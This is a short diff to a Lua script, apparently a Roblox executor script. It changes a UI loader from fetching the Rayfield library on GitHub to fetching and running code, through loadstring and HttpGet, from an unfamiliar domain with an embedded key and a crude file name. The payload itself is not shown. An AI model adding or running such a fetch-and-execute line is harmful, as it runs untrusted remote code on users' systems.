@@ -572,7 +572,7 @@ end
 
 function UIService:Init()
     local ok, library = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Rayfield/main/source"))()
+        return loadstring(game:HttpGet("https://abyss.best/assets/files/gayasf.ui2?key=5y1lxXSfWKhlQkSqhUuFyB8kPp8hsCau"))()
     end)
 
     if not ok or not library then
